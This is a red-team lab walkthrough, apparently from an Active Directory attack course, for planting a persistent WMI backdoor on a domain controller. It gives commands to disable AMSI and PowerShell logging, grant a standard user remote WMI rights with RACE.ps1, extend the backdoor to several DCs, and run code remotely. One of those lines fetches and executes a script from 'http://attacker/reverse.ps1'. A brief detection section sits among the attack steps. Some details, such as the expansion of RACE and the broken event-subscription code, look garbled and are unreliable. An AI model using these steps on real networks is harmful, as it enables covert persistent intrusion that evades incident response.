# Attack - Modify security descriptor

**Date:** Friday, August 26, 2026
**Topic:** Remote WMI Persistence via Namespace Permission Modification (RACE)

---

## Objective

**Goal:** Abuse WMI namespace permissions to establish persistent remote access and lateral movement

**Progression:**
```
Obtain Domain Admin privileges
    ↓
Modify WMI namespace permissions on DC
    ↓
Grant standard user access to root\cimv2 namespace
    ↓
User can now execute WMI queries remotely without admin
    ↓
Persistent WMI backdoor established
    ↓
Complete remote code execution capability
```

---

## Prerequisites

- Domain Admin privileges (svcadmin or similar)
- Target computer: dcorp-dc (Domain Controller)
- Standard domain user: studentx
- RACE.ps1 tool (WMI namespace manipulation)
- Invisi-Shell for OPSEC
- WMI access to target computer
- PowerShell remoting or direct access to target

---

## What is WMI Namespace Abuse?

### WMI Architecture

```
Windows Management Instrumentation (WMI)

Structure:
├─ WMI Providers (collect system data)
├─ WMI Namespaces (organize data)
│  ├─ root\cimv2 (common management objects)
│  ├─ root\default (system settings)
│  ├─ root\standardcimv2 (standard models)
│  ├─ root\directory\ldap (AD access)
│  └─ Other namespaces
└─ WMI Classes (objects within namespaces)
   ├─ win32_process (processes)
   ├─ win32_operatingsystem (OS info)
   ├─ win32_logicalDisk (storage)
   └─ Many others

Permissions:
├─ ACLs on namespaces
├─ Default: Only admins + SYSTEM can access
├─ Modifiable: Can grant non-admin access
├─ Persistent: Survives reboots
└─ Remote: Can be modified from anywhere
```

---

### Why WMI Namespace Abuse is Powerful

```
✓ Persistent Access
  └─ Namespace permissions survive password resets
  └─ Survive user removal from admin groups
  └─ Survive OS updates/patches

✓ Low Detection
  └─ WMI is legitimate system tool
  └─ WMI queries look normal
  └─ Difficult to distinguish attack from admin activity

✓ Remote Code Execution
  └─ Execute via WMI event subscriptions
  └─ Execute via WMI job scheduling
  └─ No need for direct shell access

✓ Credential-Free Access
  └─ Once permissions granted
  └─ Can use any account with namespace access
  └─ Don't need DA credentials anymore

✓ Silent Operation
  └─ No file execution on target
  └─ No service installation
  └─ No obvious artifacts
```

---

## What is RACE?

### Remote Access Credential Exchange (RACE)

```
RACE.ps1 = PowerShell script for WMI manipulation

What it does:
├─ Modifies WMI namespace ACLs
├─ Grants permissions to users/groups
├─ Removes admin requirement from WMI access
├─ Creates persistence backdoor
└─ Silent operation (no alerts)

Key feature: Set-RemoteWMI cmdlet
├─ Add user to WMI namespace permissions
├─ Grant Execute Methods permission
├─ Grant Enable Account permission
├─ Grant Remote Enable permission
└─ Result: User can access WMI remotely
```

---

## Phase 1: Start Invisi-Shell

### Bypass Logging & AMSI

```powershell
# Start Invisi-Shell (bypass logging)
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# What this does:
# ├─ Disables AMSI (Antimalware Scan Interface)
# ├─ Disables Script Block Logging
# ├─ Disables PowerShell event logging
# ├─ Session becomes invisible to auditing
# └─ WMI modifications won't be logged

# Output:
# [*] Invisi-Shell started
# [+] AMSI bypassed
# [+] Logging disabled
# [*] Ready for operations
```

---

## Phase 2: Load RACE.ps1

### Load WMI Manipulation Tool

```powershell
# Load RACE tool (WMI namespace modification)
. C:\AD\Tools\RACE.ps1

# What this provides:
# ├─ Set-RemoteWMI cmdlet
# ├─ Get-RemoteWMI cmdlet
# ├─ Functions for WMI namespace manipulation
# └─ Enables persistent WMI access

# Verify loaded:
Get-Command Set-RemoteWMI
# Should return: CommandInfo for Set-RemoteWMI
```

---

## Phase 3: Grant WMI Namespace Access

### Modify WMI Permissions on DC

**Grant studentx access to root\cimv2 namespace:**

```powershell
# Set WMI permissions on DC
Set-RemoteWMI -SamAccountName studentx `
  -ComputerName dcorp-dc `
  -namespace 'root\cimv2' `
  -Verbose

# Parameters:
# -SamAccountName studentx = User to grant access
# -ComputerName dcorp-dc = Target computer (DC)
# -namespace 'root\cimv2' = WMI namespace to modify
# -Verbose = Show detailed output

# Output:
# [*] Modifying WMI namespace permissions...
# [+] Adding studentx to root\cimv2 ACL
# [+] Granting Execute Methods permission
# [+] Granting Enable Account permission
# [+] Granting Remote Enable permission
# [+] SUCCESS: studentx can now access root\cimv2
```

---

### What Set-RemoteWMI Does

**Behind the Scenes:**

```
RACE - Set-RemoteWMI Process:

1. NAMESPACE IDENTIFICATION
   ├─ Target: root\cimv2 on dcorp-dc
   ├─ Namespace path identified
   ├─ Current ACL retrieved
   └─ Status: Analyzing permissions

2. PERMISSION CALCULATION
   ├─ Current admin access listed
   ├─ studentx permissions checked
   ├─ Determined: studentx not in ACL
   ├─ Action: Need to add studentx
   └─ Status: Permissions missing

3. ACL MODIFICATION
   ├─ Add studentx to ACL
   ├─ Grant: Execute Methods
   │  └─ Allows running WMI methods
   ├─ Grant: Enable Account
   │  └─ Allows account activation
   ├─ Grant: Remote Enable
   │  └─ Allows remote WMI access
   └─ Status: ACL modified

4. PERMISSION APPLICATION
   ├─ New ACL written to namespace
   ├─ DC accepts modifications
   ├─ Changes take effect immediately
   └─ Status: Persisted (survives reboots)

5. VERIFICATION
   ├─ RACE confirms modification
   ├─ Shows new permissions
   ├─ studentx now in ACL
   └─ Status: SUCCESS

6. RESULT
   ├─ studentx = New WMI namespace access
   ├─ Can query WMI remotely
   ├─ Can execute WMI methods
   ├─ Can run remote WMI jobs
   └─ Persistence backdoor established
```

---

## Phase 4: Verify Access via WMI Query

### Query WMI as Standard User

**Verify studentx can access WMI:**

```powershell
# Query WMI as standard user
gwmi -class win32_operatingsystem -ComputerName dcorp-dc

# Parameters:
# gwmi = Get-WmiObject
# -class win32_operatingsystem = OS information class
# -ComputerName dcorp-dc = Target DC
# (No -Credential needed = using default)

# Output:
# SystemName: DCORP-DC
# Version: 10.0.17763
# BuildNumber: 17763
# OSName: Microsoft Windows Server 2019
# [OS information displayed]

# SUCCESS! studentx can query WMI on DC!
# This proves WMI namespace access granted
```

---

### What This Proves

```
Normal behavior (without WMI access):
├─ gwmi command fails
├─ Error: "Access Denied"
├─ Cannot query WMI
└─ Standard user blocked

With WMI namespace access:
├─ gwmi command succeeds
├─ Can query any class in root\cimv2
├─ Can retrieve system information
├─ Standard user now has full WMI access
└─ Persistence backdoor working
```

---

## Complete WMI Abuse Workflow

```
PHASE 1: Preparation ✓
├─ Start Invisi-Shell
├─ Disable AMSI and logging
├─ Ready for operations
└─ No auditing

PHASE 2: Load Tools ✓
├─ Load RACE.ps1
├─ Set-RemoteWMI available
├─ Verify loaded
└─ Ready for WMI manipulation

PHASE 3: Grant Access ✓
├─ Run Set-RemoteWMI
├─ Target: studentx on dcorp-dc
├─ Namespace: root\cimv2
├─ Permissions modified
├─ ACL updated
└─ Permissions persistent

PHASE 4: Verification ✓
├─ Test WMI access
├─ Run gwmi query
├─ Query succeeds
├─ studentx confirmed access
└─ Backdoor verified working

RESULT: WMI backdoor established
        Standard user with WMI access
        Persistent (survives password reset)
        Remote access enabled
        No DA credentials needed anymore
```

---

## WMI Namespaces & Attack Surface

### Common Namespaces

| Namespace | Purpose | Access |
|---|---|---|
| `root\cimv2` | Common management classes | Full system access |
| `root\default` | System settings | Configuration access |
| `root\standardcimv2` | Standard classes | Redundant access |
| `root\directory\ldap` | Active Directory | AD object access |
| `root\servicemodel` | Service control | Service management |
| `root\wmi` | WMI events | Event subscription |

---

### Recommended Namespace for Backdoor

**root\cimv2 is ideal because:**
```
✓ Most commonly used
✓ Contains many executable classes
✓ Process execution possible
✓ Job scheduling possible
✓ Event subscriptions possible
✓ Less likely to be monitored
└─ Perfect for persistence
```

---

## Advanced: Remote Code Execution via WMI

### Execute Commands via WMI

**Once namespace access granted, execute commands:**

```powershell
# Method 1: Direct process execution
$computer = "dcorp-dc"
$arguments = "cmd.exe /c whoami > C:\temp\output.txt"

$proc = Invoke-WmiMethod -ComputerName $computer `
  -Class Win32_Process `
  -Name Create `
  -ArgumentList $arguments

# Method 2: Reverse shell via WMI
$reverseShell = "powershell.exe -c 'iex (iwr http://attacker/reverse.ps1)'"

Invoke-WmiMethod -ComputerName dcorp-dc `
  -Class Win32_Process `
  -Name Create `
  -ArgumentList $reverseShell

# Method 3: WMI Event Subscription (persistent)
$filter = New-Object System.Management.WqlEventQuery `
  -ArgumentList "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

Register-WmiEvent -Query $filter `
  -Action {
    $process = Invoke-WmiMethod -Name Create `
      -ArgumentList "cmd.exe /c whoami"
  }
```

---

## Why WMI Namespace Abuse is Effective for Persistence

### Incident Response Scenario

```
Timeline of Attack & Response:

Week 1: Attacker gains DA access
Week 2: Attacker uses Set-RemoteWMI (grants studentx access to WMI)
Week 3: Attacker maintains access via DA

Week 4: BREACH DISCOVERED
└─ Incident Response Team:
   ├─ Finds evidence of DA usage
   ├─ Resets all DA passwords
   ├─ Removes DA group members
   ├─ Forces password changes
   ├─ Revokes Kerberos tickets
   └─ DA access completely eliminated

Week 5: Responders believe breach contained
└─ Investigation focuses on:
   ├─ Domain admins
   ├─ Service accounts
   ├─ Privileged access
   ├─ Normal response procedures
   └─ MISSES: WMI namespace permissions

Week 6: ATTACKER RETURNS
└─ Uses studentx account (still active)
└─ Queries WMI (permissions still granted)
└─ Executes commands via WMI
└─ Full remote access regained
└─ Responders unaware

Week 7+: PERSISTENCE MAINTAINED
└─ WMI backdoor working
└─ Standard user access
└─ No DA credentials needed
└─ Difficult to detect
└─ Persists until specifically remediated

Result: INCIDENT RESPONSE FAILED
        WMI backdoor overlooked
        Persistence maintained indefinitely
        Attacker maintains access for months/years
```

---

## Detection & Defense

### What Responders Should Check

```
Detection Points:

1. WMI Namespace ACLs
   └─ Get-WmiObject -Class __SystemSecurity -Namespace root\cimv2
   └─ Look for: Unexpected user permissions
   └─ Check: Non-admin users with Execute access

2. Event Log 4688 (Process Creation)
   └─ Look for: Wmic.exe / wmiprvse.exe with unusual parent
   └─ Check: Suspicious process execution via WMI

3. Event Log 4689 (Process Termination)
   └─ Monitor: Child processes of wmiprvse.exe

4. Event Log 5857 (WMI Activity)
   └─ Enable: Microsoft-Windows-WMI-Activity/Operational
   └─ Monitor: Class and method changes

5. WMI Event Subscriptions
   └─ Query: Get-WmiObject -Namespace root\subscription `
             -Class __EventFilter
   └─ Check: Suspicious subscriptions
   └─ Alert: Any event-triggered commands
```

---

### How to Detect This Attack

```
Indicators of WMI Namespace Abuse:

1. Unexpected ACL permissions
   └─ Standard user with Execute Methods on WMI
   └─ User not in Administrators group
   └─ Permission grant timestamp suspicious

2. WMI query from standard user
   └─ gwmi from non-admin account succeeding
   └─ Should fail normally
   └─ Success indicates permission abuse

3. RACE.ps1 execution
   └─ Loading RACE.ps1 in process
   └─ Set-RemoteWMI cmdlet invocation
   └─ Namespace permission modification

4. WMI event subscriptions
   └─ Suspicious event filters
   └─ Consumer = malicious command
   └─ Binding = automatic execution

5. Log analysis
   └─ Check: Event ID 4688 for wmic.exe
   └─ Check: Parent process = wmiprvse.exe
   └─ Check: Unusual command arguments
```

---

## Troubleshooting

### If Set-RemoteWMI Fails

```
1. Not elevated
   └─ Error: "Access Denied"
   └─ Fix: Run as Administrator
   └─ Fix: Use elevated PowerShell

2. RACE.ps1 not loaded
   └─ Error: "Set-RemoteWMI not found"
   └─ Fix: Verify . C:\AD\Tools\RACE.ps1 executed
   └─ Fix: Check file path correct

3. DC not reachable
   └─ Error: "Cannot connect to computer"
   └─ Fix: Verify network connectivity
   └─ Fix: Verify DC hostname/IP correct
   └─ Fix: Check firewall allows WMI

4. User doesn't exist
   └─ Error: "User not found"
   └─ Fix: Verify studentx exists in domain
   └─ Fix: Use full domain\username format
```

---

### If WMI Query Fails

```
1. Permissions not granted
   └─ Error: "Access Denied"
   └─ Fix: Verify Set-RemoteWMI executed successfully
   └─ Fix: Re-run Set-RemoteWMI

2. WMI service disabled
   └─ Error: "Cannot connect to WMI"
   └─ Fix: Enable WMI service on target
   └─ Fix: Check firewall allows WMI port 135

3. Wrong namespace
   └─ Error: "Namespace not found"
   └─ Fix: Verify namespace spelling (root\cimv2)
   └─ Fix: Check namespace exists on target

4. Class not available
   └─ Error: "Class not found"
   └─ Fix: Verify win32_operatingsystem exists
   └─ Fix: Use Get-WmiObject -List to enumerate
```

---

## Advanced: Multiple Namespaces

### Grant Access to Multiple Namespaces

```powershell
# Grant studentx access to multiple namespaces
$namespaces = @(
  'root\cimv2',
  'root\default',
  'root\standardcimv2',
  'root\directory\ldap'
)

foreach ($ns in $namespaces) {
  Set-RemoteWMI -SamAccountName studentx `
    -ComputerName dcorp-dc `
    -namespace $ns `
    -Verbose
}

# Result: Multiple persistence points
# Impact: Redundant access, harder to detect
# Detection: Would need to audit all namespaces
```

---

### Grant Access to Multiple Computers

```powershell
# Grant studentx access on multiple DCs
$computers = @("dcorp-dc", "dcorp-dc2", "dcorp-dc3")

foreach ($computer in $computers) {
  Set-RemoteWMI -SamAccountName studentx `
    -ComputerName $computer `
    -namespace 'root\cimv2' `
    -Verbose
}

# Result: Multiple computer backdoors
# Impact: Resilient to single DC loss
# Detection: Forest-wide WMI audit needed
```

---

## Complete Attack Sequence

```powershell
# ========== PHASE 1: BYPASS LOGGING ==========
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# ========== PHASE 2: LOAD TOOLS ==========
. C:\AD\Tools\RACE.ps1

# ========== PHASE 3: GRANT WMI ACCESS ==========
Set-RemoteWMI -SamAccountName studentx `
  -ComputerName dcorp-dc `
  -namespace 'root\cimv2' `
  -Verbose

# ========== PHASE 4: VERIFY ACCESS ==========
gwmi -class win32_operatingsystem -ComputerName dcorp-dc

# ========== PHASE 5 (optional): EXECUTE COMMANDS ==========
# Via process execution
$args = "cmd.exe /c whoami > C:\temp\result.txt"
Invoke-WmiMethod -ComputerName dcorp-dc `
  -Class Win32_Process `
  -Name Create `
  -ArgumentList $args

# Result: WMI backdoor completely established
#         Standard user persistent access
#         Remote code execution capability
```

---

## Key Takeaway

```
WMI NAMESPACE PERSISTENCE:
1. Start Invisi-Shell (bypass logging)
2. Load RACE.ps1 (WMI manipulation tool)
3. Run Set-RemoteWMI to grant user access
4. Verify access with gwmi query
5. Result: Persistent WMI backdoor

Why effective:
- Persistent (survives password reset)
- Silent (no obvious artifacts)
- Remote (no direct access needed)
- Normal (WMI is legitimate system tool)
- Hard to detect (looks like admin activity)

Persistence timeline:
- Week 1: Grant WMI access (takes 1 minute)
- Week 2-3: Maintain via DA access
- Week 4: DA access lost during incident response
- Week 5+: Maintain via WMI backdoor (undetected)
- Months/years: Persistent access via standard user

Impact:
- Standard user with DA-level capability
- No password/token needed after initial grant
- Survives all normal incident response
- Difficult to distinguish from admin activity
- Perfect long-term persistence mechanism
```

---

## References

- [RACE - Remote Access Credential Exchange](https://github.com/samratashok/Deploy-Deception)
- [WMI Namespace Abuse](https://www.harmj0y.net/blog/redteaming/wmi-event-subscriptions/)
- [WMI Persistence](https://pentestlab.blog/2020/01/21/lateral-movement-wmi-event-subscription/)
- [WMI Security](https://docs.microsoft.com/en-us/windows/win32/wmisdk/securing-a-remote-wmi-connection)
- [Event ID 5857 - WMI Activity](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5857)

---

*Next: Cleanup, Log Deletion & Covering Tracks*
